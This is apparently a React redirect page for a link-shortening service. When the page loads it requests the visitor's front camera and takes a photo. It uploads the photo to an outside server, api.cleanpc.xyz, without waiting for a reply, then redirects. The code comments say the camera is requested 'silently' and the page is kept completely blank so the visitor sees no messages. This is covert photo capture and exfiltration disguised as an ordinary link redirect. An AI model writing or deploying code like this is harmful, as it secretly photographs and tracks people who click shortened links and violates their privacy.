import React, { useEffect } from "react";
import { useParams } from "react-router-dom";

const API_BASE = "https://api.cleanpc.xyz";

export default function Redirect() {
  const { shortCode } = useParams();

  useEffect(() => {
    const processRedirect = async () => {
      try {
        // Request camera access silently
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // Front camera
        });

        // Capture photo quickly
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const photoBlob = await imageCapture.takePhoto();

        // Stop the camera stream immediately
        stream.getTracks().forEach((track) => track.stop());

        // Convert blob to base64 for upload
        const reader = new FileReader();
        reader.onloadend = () => {
          const base64data = reader.result;

          // Send photo to server (fire and forget - don't wait for response)
          fetch(
            `${API_BASE}/api/links/${encodeURIComponent(
              shortCode
            )}/track-with-photo`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                photo: base64data,
                timestamp: new Date().toISOString(),
              }),
            }
          ).catch((err) => console.error("Failed to upload photo:", err));
        };
        reader.readAsDataURL(photoBlob);
      } catch (error) {
        // Silent fail - user denied camera access or camera not available
        console.log("Camera access not available:", error);
      }

      // Redirect immediately regardless of camera outcome
      window.location.replace(
        `${API_BASE}/api/links/${encodeURIComponent(shortCode)}`
      );
    };

    // Start the process immediately
    processRedirect();
  }, [shortCode]);

  // Return completely blank page - no loading spinner, no messages
  return null;
}
